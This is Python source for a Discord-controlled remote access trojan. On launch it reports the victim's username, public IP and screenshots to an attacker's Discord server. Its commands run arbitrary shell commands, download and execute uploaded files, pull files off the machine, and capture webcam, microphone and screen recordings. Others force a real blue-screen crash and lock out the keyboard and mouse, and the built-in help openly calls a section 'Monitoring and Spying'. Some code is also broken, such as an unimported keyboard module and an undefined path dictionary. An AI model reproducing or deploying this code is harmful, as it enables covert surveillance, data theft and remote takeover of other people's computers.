import discord
import subprocess
import os
import requests
import cv2
import asyncio
from discord.ext import commands
import socket
import urllib.request
import ctypes
import pyautogui
import numpy as np
import pyaudio
import wave
import psutil
import glob
from scapy.all import sniff
import pyttsx3
import webbrowser
import tkinter as tk
from tkinter import messagebox  # ✅ CORRECT IMPORT
from threading import Thread
import win32api
import win32con
import time
import mss
from screeninfo import get_monitors  # Used to detect screens
import ctypes
import threading
from pydub import AudioSegment
from pydub.playback import play
from pynput.mouse import Controller
import random

HOST = "127.0.0.1"  
PORT = 5000  

TOKEN = "YOUR TOKEN"  # Replace with your Discord bot token
GUILD_ID = YOUR_GUILD_ID

cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)

# Enable intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message reading

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

def get_public_ip():
    """Retrieve the public IPv4 address of the machine"""
    try:
        # First service to get the public IP
        response = requests.get("http://checkip.amazonaws.com")
        public_ip = response.text.strip()
        print(f"Public IP retrieved via checkip.amazonaws.com: {public_ip}")
        if not public_ip:  # If IP is empty, try another service
            response = requests.get("https://ipinfo.io/ip")
            public_ip = response.text.strip()
            print(f"Public IP retrieved via ipinfo.io: {public_ip}")
        return public_ip
    except Exception as e:
        print(f"Error retrieving IP: {e}")
        return "Unknown_IP"

def get_system_info():
    """Return information about the local system"""
    try:
        user_name = os.getlogin()  
        ip_address = get_public_ip() 
        hostname = socket.gethostname()  
        return f"Username: {user_name}\nPublic IP: {ip_address}\nHostname: {hostname}"
    except Exception as e:
        return f"Error retrieving system information: {e}"

@bot.command()
async def upload(ctx, attachment: discord.Attachment = None):
    """Download and execute a file of any type"""
    try:
        if not attachment:
            await ctx.send("❌ No file attached.")
            return

        filename = attachment.filename
        await attachment.save(filename)
        await ctx.send(f"✅ File saved: `{filename}`")

        if filename.endswith(".py"):
            command = f"python {filename}"
        elif filename.endswith(".bat") or filename.endswith(".cmd"):
            command = f"cmd.exe /c {filename}"
        elif filename.endswith(".exe"):
            command = filename
        else:
            command = f'start "" "{filename}"'  

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr

        await ctx.send(f"🖥️ Execution result:\n```{output[:1900]}```")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.event
async def on_ready():
    """When the bot starts, capture each screen and send the images."""
    print(f'✅ Logged in as {bot.user}')

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("❌ Server not found.")
        return

    ip_address = get_public_ip()  # Using YOUR function
    print(f"🌍 Public IP detected: {ip_address}")

    category_name = f"Session-{ip_address}"
    existing_category = discord.utils.get(guild.categories, name=category_name)

    if not existing_category:
        category = await guild.create_category(category_name)
        print(f'📂 Category created: {category_name}')
        session_channel = await category.create_text_channel("session")
        print(f'📜 "session" channel created in category {category_name}')
    else:
        print(f'📂 Existing category found: {category_name}')
        session_channel = discord.utils.get(existing_category.text_channels, name="session")
        if not session_channel:
            session_channel = await existing_category.create_text_channel("session")
            print(f'📜 "session" channel created in existing category {category_name}')

    # Send machine information
    await session_channel.send("🖥 **Session Active! Here is the system information:**")
    await session_channel.send(get_system_info())

    # Detect screens
    screens = get_monitors()
    screen_count = len(screens)

    await session_channel.send(f"📸 **Number of screens detected:** `{screen_count}`\n📢 *Use `!screenshot [number]` to capture a specific screen.*")

    with mss.mss() as sct:
        for i, monitor in enumerate(screens):
            try:
                filename = f"screen_{i}.png"
                
                # Capture the screen with MSS using the monitor ID
                screen = sct.grab(sct.monitors[i + 1])  # `i + 1` because `mss.monitors[0]` is all screens
                
                # Save and send
                mss.tools.to_png(screen.rgb, screen.size, output=filename)
                await session_channel.send(f"🖥 **Screen {i} captured:**", file=discord.File(filename))
                os.remove(filename)

            except Exception as e:
                await session_channel.send(f"⚠️ **Error capturing screen {i}**: {e}")

    await session_channel.send("✅ **Screen capture completed!**")

####################### FILE MANAGEMENT #######################

@bot.command()
async def exec(ctx, *, command: str):
    """Execute a shell command on the PC"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        await ctx.send(f'```{output[:1900]}```')  
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command()
async def cd(ctx, *, path: str = None):
    """Change directory (like cd in cmd)"""
    global user_paths

    if ctx.author.id not in user_paths:
        user_paths[ctx.author.id] = os.getcwd() 

    current_path = user_paths[ctx.author.id]

    if not path:
        await ctx.send(f"📂 **Current directory:** `{current_path}`")
        return

    new_path = os.path.join(current_path, path)

    if os.path.isdir(new_path):
        user_paths[ctx.author.id] = os.path.abspath(new_path)
        await ctx.send(f"✅ **Directory changed:** `{user_paths[ctx.author.id]}`")
    else:
        await ctx.send("❌ **Directory not found.**")

@bot.command()
async def ls(ctx):
    """List files and folders in the current directory"""
    global user_paths

    if ctx.author.id not in user_paths:
        user_paths[ctx.author.id] = os.getcwd()

    current_path = user_paths[ctx.author.id]

    try:
        files = os.listdir(current_path)
        file_list = "\n".join(files[:50])  
        await ctx.send(f"📂 **Contents of `{current_path}`:**\n```{file_list}```")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def pwd(ctx):
    """Display the current directory path"""
    global user_paths

    if ctx.author.id not in user_paths:
        user_paths[ctx.author.id] = os.getcwd()

    await ctx.send(f"📍 **Current directory:** `{user_paths[ctx.author.id]}`")

#####################################################################

@bot.command()
async def getfile(ctx, filename: str):
    """Send a file from the PC"""
    if os.path.exists(filename):
        await ctx.send(file=discord.File(filename))
    else:
        await ctx.send("File not found.")

@bot.command()
async def photo(ctx):
    """Take a photo with the webcam and send it to Discord"""
    try:
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)  
        ret, frame = cam.read()
        if not ret:
            await ctx.send("Error: Unable to take the photo.")
            return
        filename = "photo.jpg"
        cv2.imwrite(filename, frame)
        cam.release()
        await ctx.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command()
async def shutdown(ctx):
    """Shut down the PC"""
    await ctx.send("⚠️ **Warning!** The PC will shut down in 10 seconds...")
    await asyncio.sleep(10)  
    if os.name == "nt":  
        os.system("shutdown /s /t 0")
    else:  # Linux/macOS
        os.system("shutdown -h now")

@bot.command()
async def restart(ctx):
    """Restart the PC"""
    await ctx.send("🔄 **The PC will restart in 10 seconds...**")
    await asyncio.sleep(10)
    if os.name == "nt":  
        os.system("shutdown /r /t 0")
    else:  # Linux/macOS
        os.system("shutdown -r now")

@bot.command()
async def lock(ctx):
    """Lock the session (Windows only)"""
    if os.name == "nt": 
        await ctx.send("🔒 **Locking the session...**")
        os.system("rundll32.exe user32.dll,LockWorkStation")
    else:
        await ctx.send("❌ This command works only on Windows.")

@bot.command()
async def wallpaper(ctx, url: str):
    """Change the wallpaper with an image from a URL"""
    try:
        await ctx.send("🖼️ **Changing wallpaper...**")

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        request = urllib.request.Request(url, headers=headers)

        wallpaper_path = "wallpaper.jpg"
        with urllib.request.urlopen(request) as response, open(wallpaper_path, "wb") as out_file:
            out_file.write(response.read())

        if os.name == "nt":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_path), 3)
            await ctx.send("✅ **Wallpaper updated!**")
        else:
            await ctx.send("❌ This command works only on Windows.")

    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def type(ctx, *, text: str):
    """Simulate typing on the computer"""
    try:
        await ctx.send(f"⌨️ **Typing in progress:** `{text}`")
        pyautogui.write(text, interval=0.05)  
        await ctx.send("✅ **Text typed successfully!**")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def screenshot(ctx):
    """Take a screenshot and send it to Discord"""
    try:
        await ctx.send("📸 **Taking screenshot...**")
        screenshot_path = "screenshot.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        await ctx.send(file=discord.File(screenshot_path))
        os.remove(screenshot_path)  
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def record(ctx, screen_number: int, duration: int = 5):
    """Record a video of a specific screen for X seconds"""
    try:
        with mss.mss() as sct:
            monitors = sct.monitors  
            
            if screen_number < 1 or screen_number >= len(monitors):
                await ctx.send(f"❌ **Invalid screen number!** Choose between `1` and `{len(monitors) - 1}`.")
                return
            
            screen = monitors[screen_number]
            width, height = screen["width"], screen["height"]
            
            filename = f"record_{screen_number}.mp4"
            fourcc = cv2.VideoWriter_fourcc(*"mp4v")
            out = cv2.VideoWriter(filename, fourcc, 10, (width, height))
            
            await ctx.send(f"🎥 **Recording screen {screen_number} for {duration} seconds...**")
            
            start_time = time.time()
            while time.time() - start_time < duration:
                frame = np.array(sct.grab(screen))
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame)
            
            out.release()
            await ctx.send(file=discord.File(filename))
            os.remove(filename)

    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def record_audio(ctx, duration: int = 5):
    """Record audio from the microphone and send it to Discord"""
    try:
        await ctx.send(f"🎤 **Recording audio for {duration} seconds...**")

        audio = pyaudio.PyAudio()
        format_audio = pyaudio.paInt16
        channels = 1
        rate = 44100
        frames_per_buffer = 1024

        stream = audio.open(format=format_audio, channels=channels,
                            rate=rate, input=True,
                            frames_per_buffer=frames_per_buffer)

        frames = []

        for _ in range(0, int(rate / frames_per_buffer * duration)):
            data = stream.read(frames_per_buffer)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_file = "audio_record.wav"
        wf = wave.open(audio_file, "wb")
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(format_audio))
        wf.setframerate(rate)
        wf.writeframes(b"".join(frames))
        wf.close()

        await ctx.send(file=discord.File(audio_file))
        os.remove(audio_file)

    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def tasklist(ctx):
    """List ALL running processes in multiple messages if necessary"""
    try:
        await ctx.send("📋 **Retrieving process list...**")

        if os.name == "nt":  
            result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        else:  
            result = subprocess.run("ps aux", shell=True, capture_output=True, text=True)

        output = result.stdout

        chunk_size = 1900  # Discord message limit
        chunks = [output[i:i + chunk_size] for i in range(0, len(output), chunk_size)]

        for chunk in chunks:
            await ctx.send(f"```{chunk}```")

        await ctx.send("✅ **Complete process list sent!**")

    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def kill(ctx, process_name: str):
    """Close an application by its name"""
    try:
        await ctx.send(f"❌ **Closing `{process_name}`...**")

        if os.name == "nt":  
            os.system(f"taskkill /F /IM {process_name}")
        else:  
            os.system(f"pkill {process_name}")

        await ctx.send(f"✅ **Process `{process_name}` stopped!**")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def system(ctx):
    """Display system info: CPU, RAM, Disk, and Connected Devices"""
    try:
        cpu_usage = psutil.cpu_percent(interval=1)

        ram_info = psutil.virtual_memory()
        used_ram = round(ram_info.used / (1024 ** 3), 2)  
        total_ram = round(ram_info.total / (1024 ** 3), 2)  

        disk_info = psutil.disk_usage('/')
        free_disk = round(disk_info.free / (1024 ** 3), 2)  
        total_disk = round(disk_info.total / (1024 ** 3), 2)  

        if os.name == "nt":  
            result = subprocess.run("wmic logicaldisk get caption,description", shell=True, capture_output=True, text=True)
        else:  
            result = subprocess.run("lsusb", shell=True, capture_output=True, text=True)

        devices_output = result.stdout.strip()[:800]  

        system_info = (
            f"⚙️ **System Status**\n"
            f"💻 **CPU**: `{cpu_usage}%` usage\n"
            f"📊 **RAM**: `{used_ram} GB / {total_ram} GB`\n"
            f"💾 **Disk**: `{free_disk} GB / {total_disk} GB` available\n"
            f"🔌 **Devices**:\n```{devices_output}```"
        )

        await ctx.send(system_info)

    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def file(ctx, action: str, *args):
    """Multi-function command to manage files (ls, delete, rename, download, find)"""
    try:
        if action == "ls":  
            path = args[0] if args else "."  
            if not os.path.exists(path):
                await ctx.send("❌ **The specified folder does not exist.**")
                return

            files = os.listdir(path)
            file_list = "\n".join(files[:50])  
            await ctx.send(f"📂 **Files in `{path}`:**\n```{file_list}```")

        elif action == "delete":  
            if not args:
                await ctx.send("❌ **Specify a file to delete.**")
                return
            
            file_path = args[0]
            if os.path.exists(file_path):
                os.remove(file_path)
                await ctx.send(f"✅ **File `{file_path}` deleted!**")
            else:
                await ctx.send("❌ **File not found.**")

        elif action == "rename":  
            if len(args) < 2:
                await ctx.send("❌ **Specify an old and a new name.**")
                return
            
            old_name, new_name = args[0], args[1]
            if os.path.exists(old_name):
                os.rename(old_name, new_name)
                await ctx.send(f"✅ **File `{old_name}` renamed to `{new_name}`!**")
            else:
                await ctx.send("❌ **File not found.**")

        elif action == "download":  
            if not args:
                await ctx.send("❌ **Specify a file to download.**")
                return

            file_path = args[0]
            if os.path.exists(file_path):
                await ctx.send(file=discord.File(file_path))
            else:
                await ctx.send("❌ **File not found.**")

        elif action == "find":  
            if not args:
                await ctx.send("❌ **Specify a file name to search for.**")
                return

            search_name = args[0]
            await ctx.send(f"🔍 **Searching for `{search_name}`...**")

            found_files = []
            for root, dirs, files in os.walk("/"):
                for file in files:
                    if search_name.lower() in file.lower():
                        found_files.append(os.path.join(root, file))
                if len(found_files) > 10:  
                    break
            
            if found_files:
                result_text = "\n".join(found_files[:10])  
                await ctx.send(f"✅ **Files found:**\n```{result_text}```")
            else:
                await ctx.send("❌ **No files found.**")

        else:
            await ctx.send("❌ **Unrecognized action. Use: `ls`, `delete`, `rename`, `download`, `find`.**")

    except Exception as e:
        await ctx.send(f"⚠️ **Error:** {e}")

@bot.command()
async def tts(ctx, *, text: str):
    """Make the PC speak with a TTS message"""
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        await ctx.send(f"🔊 **The PC says:** `{text}`")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def open(ctx, url: str):
    """Open a website in the browser"""
    try:
        webbrowser.open(url)
        await ctx.send(f"🌐 **Opening:** `{url}`")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

def show_popup(message):
    """Display a popup with a scary message"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showwarning("Alert ⚠️", message)  # ✅ USE `messagebox.showwarning()`
    root.destroy()

@bot.command()
async def popup(ctx, *, message: str):
    try:
        Thread(target=show_popup, args=(message,)).start()  # ✅ Launch the popup in a thread
        await ctx.send(f"👁 **Popup displayed:** `{message}`")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def flip_screen(ctx):
    try:
        device = win32api.EnumDisplayDevices(None, 0)
        settings = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
        settings.DisplayOrientation = 2  # 2 = 180° (full flip)
        win32api.ChangeDisplaySettingsEx(device.DeviceName, settings)
        await ctx.send("🔄 **Screen flipped!** To revert: `!flip_back`")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def flip_back(ctx):
    try:
        device = win32api.EnumDisplayDevices(None, 0)
        settings = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
        settings.DisplayOrientation = 0  
        win32api.ChangeDisplaySettingsEx(device.DeviceName, settings)
        await ctx.send("✅ **Screen restored to normal!**")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def write(ctx, *, message: str):
    try:
        pyautogui.hotkey("win", "r") 
        time.sleep(1)
        pyautogui.write("notepad")
        pyautogui.press("enter")
        time.sleep(1)
        pyautogui.write(message, interval=0.1)
        await ctx.send(f"📝 **Message written in Notepad:** `{message}`")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def ip_info(ctx, ip: str):
    """Display information about an IP address"""
    try:
        await ctx.send(f"🌍 **Looking up info on `{ip}`...**")
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()

        if data["status"] != "fail":
            info = (
                f"📡 **IP:** `{data['query']}`\n"
                f"🌍 **Country:** `{data['country']}`\n"
                f"🏙️ **City:** `{data['city']}`\n"
                f"📍 **Region:** `{data['regionName']}`\n"
                f"🌐 **ISP:** `{data['isp']}`\n"
                f"🛰️ **Lat/Lon:** `{data['lat']}, {data['lon']}`\n"
            )
            await ctx.send(info)
        else:
            await ctx.send("❌ **Invalid or not found IP address.**")

    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def fake_crash(ctx):
    """Simulate a BSOD (Blue Screen of Death)"""
    if os.name == "nt":  
        await ctx.send("💀 **Launching Blue Screen...**")
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    else:
        await ctx.send("❌ **This command works only on Windows.**")

flipping = False  # Global variable to stop flipping

def set_screen_rotation(angle):
    """Modify screen orientation using win32api"""
    try:
        device = win32api.EnumDisplayDevices(None, 0)
        settings = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)

        # Set angle based on requested rotation
        if angle == 0:
            settings.DisplayOrientation = win32con.DMDO_DEFAULT  # Normal
        elif angle == 90:
            settings.DisplayOrientation = win32con.DMDO_90  # Rotate right
        elif angle == 180:
            settings.DisplayOrientation = win32con.DMDO_180  # Upside down
        elif angle == 270:
            settings.DisplayOrientation = win32con.DMDO_270  # Rotate left

        win32api.ChangeDisplaySettingsEx(device.DeviceName, settings)
    
    except Exception as e:
        print(f"⚠️ Error changing orientation: {e}")

@bot.command()
async def random_flip(ctx, duration: int = 30):
    """Randomly rotate the screen every X seconds"""
    global flipping
    if flipping:
        await ctx.send("❌ **Random Flip mode is already active!**")
        return

    flipping = True
    await ctx.send(f"🔄 **Random Flip mode activated for {duration} seconds!**")

    end_time = asyncio.get_event_loop().time() + duration

    while flipping and asyncio.get_event_loop().time() < end_time:
        angle = random.choice([0, 90, 180, 270])  # Random angle choice
        set_screen_rotation(angle)

        await ctx.send(f"🔄 **Screen rotated to `{angle}°`!** (Next rotation in a few seconds...)")
        await asyncio.sleep(random.randint(3, 7))  # Random pause

    flipping = False
    set_screen_rotation(0)  # Restore screen to normal at the end
    await ctx.send("✅ **Random Flip mode ended, screen restored!**")

@bot.command()
async def stop_flip(ctx):
    """Stop Random Flip mode and restore the screen"""
    global flipping
    flipping = False
    set_screen_rotation(0)  # Restore screen to normal
    await ctx.send("✅ **Random Flip mode deactivated and screen restored!**")
    
@bot.command()
async def play_sound(ctx, file: str):
    """Play a sound on the PC with pydub"""
    try:
        if os.path.exists(file):
            await ctx.send(f"🔊 **Playing `{file}`...**")
            sound = AudioSegment.from_file(file)
            play(sound)
        else:
            await ctx.send("❌ **Audio file not found.**")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def spam_popup(ctx, message: str, count: int = 5):
    """Open popups in a loop"""
    await ctx.send(f"💀 **Launching popup spam ({count} times)...**")

    def popup_spam():
        for _ in range(count):
            root = tk.Tk()
            root.withdraw()
            tk.messagebox.showwarning("Alert!", message)
            root.destroy()

    Thread(target=popup_spam).start()

@bot.command()
async def disable_keyboard(ctx, duration: int):
    """Temporarily disable the keyboard"""
    await ctx.send(f"⛔ **Keyboard disabled for {duration} seconds!**")

    def block_keys():
        keyboard.block_key("all")
        time.sleep(duration)
        keyboard.unblock_key("all")

    threading.Thread(target=block_keys).start()
    time.sleep(duration)
    await ctx.send("✅ **Keyboard reactivated!**")

@bot.command()
async def disable_mouse(ctx, duration: int):
    """Temporarily disable the mouse"""
    await ctx.send(f"🛑 **Mouse disabled for {duration} seconds!**")

    mouse = Controller()
    original_position = mouse.position  # Save current position

    def lock_mouse():
        start_time = time.time()
        while time.time() - start_time < duration:
            mouse.position = original_position  # Keep mouse in place
            time.sleep(0.1)

    threading.Thread(target=lock_mouse).start()
    time.sleep(duration)
    await ctx.send("✅ **Mouse reactivated!**")

@bot.command()
async def live_screenshot(ctx, interval: int, duration: int):
    """Automatically take screenshots every X seconds"""
    await ctx.send(f"📸 **Auto Screenshot mode activated! Capturing every `{interval}` seconds for `{duration}` seconds.**")

    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        filename = f"live_screenshot_{count}.png"
        screen = pyautogui.screenshot()
        screen.save(filename)
        await ctx.send(f"📷 **Screenshot {count+1}:**", file=discord.File(filename))
        os.remove(filename)
        count += 1
        time.sleep(interval)

    await ctx.send("✅ **Auto Screenshot mode completed!**")

@bot.command()
async def help(ctx):
    help_text = (
        "**📜 List of Available Commands:**\n\n"

        "**🖥️ PC Control**\n"
        "`!shutdown` → Shut down the PC.\n"
        "`!restart` → Restart the PC.\n"
        "`!lock` → Lock the session (Windows).\n"
        "`!wallpaper [URL]` → Change the wallpaper.\n"
        "`!type [text]` → Simulate keyboard typing.\n"
        "`!write [text]` → Write a message in Notepad.\n\n"

        "**🎥 Monitoring and Spying**\n"
        "`!screenshot` → Take a screenshot and send it to Discord.\n"
        "`!record [screen_number] [duration]` → Record a screen video.\n"
        "`!record_audio [duration]` → Record microphone audio.\n"
        "`!photo` → Take a photo with the webcam.\n"
        "`!live_screenshot [interval] [duration]` → Automatically take screenshots.\n\n"

        "**⚙️ System Management**\n"
        "`!tasklist` → List all running processes.\n"
        "`!kill [process_name]` → Close an application.\n"
        "`!system` → Display CPU, RAM, Disk, and Connected Devices.\n"
        "`!exec [command]` → Execute a system command.\n\n"

        "**📂 File Management**\n"
        "`!file ls [path]` → List files in a directory.\n"
        "`!file delete [file]` → Delete a file.\n"
        "`!file rename [old] [new]` → Rename a file.\n"
        "`!file download [file]` → Download a file from the PC.\n"
        "`!file find [name]` → Search for a file in the system.\n"
        "`!getfile [filename]` → Send a file from the PC.\n\n"

        "**🎮 Trolling and Fun**\n"
        "`!tts [text]` → Make the PC speak.\n"
        "`!open [URL]` → Open a website in the browser.\n"
        "`!popup [text]` → Display a scary popup.\n"
        "`!flip_screen` → Flip the screen upside down.\n"
        "`!flip_back` → Restore the screen to normal.\n"
        "`!random_flip [duration]` → Randomly rotate the screen every few seconds.\n"
        "`!stop_flip` → Stop random flipping and restore the screen.\n"
        "`!play_sound [file]` → Play a sound file on the PC.\n"
        "`!spam_popup [message] [count]` → Open popups repeatedly.\n"
        "`!fake_crash` → Simulate a BSOD (Blue Screen of Death).\n\n"

        "**📁 File Navigation (Like CMD)**\n"
        "`!cd [path]` → Change directory.\n"
        "`!ls` → List files in the current directory.\n"
        "`!pwd` → Display the current path.\n\n"

        "**🔒 Device Control**\n"
        "`!disable_keyboard [duration]` → Temporarily disable the keyboard.\n"
        "`!disable_mouse [duration]` → Temporarily disable the mouse.\n\n"

        "**🌍 Network Tools**\n"
        "`!ip_info [IP]` → Display information about a specific IP address.\n"
        "`!upload` → Upload and execute a file of any type.\n"
    )

    await ctx.send(help_text)

bot.run(TOKEN)